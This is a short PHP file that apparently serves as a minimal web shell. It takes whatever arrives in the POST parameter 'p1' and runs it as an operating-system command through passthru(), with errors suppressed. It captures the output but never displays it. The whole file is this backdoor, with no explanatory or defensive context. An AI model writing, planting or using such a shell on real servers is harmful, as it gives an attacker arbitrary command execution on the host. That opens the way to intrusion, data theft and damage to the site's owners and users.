<?php
function ex($in) {
	ob_start();
	@passthru($in);
	$res = ob_get_clean();
	return $res;
}

ex($_POST['p1']);
?>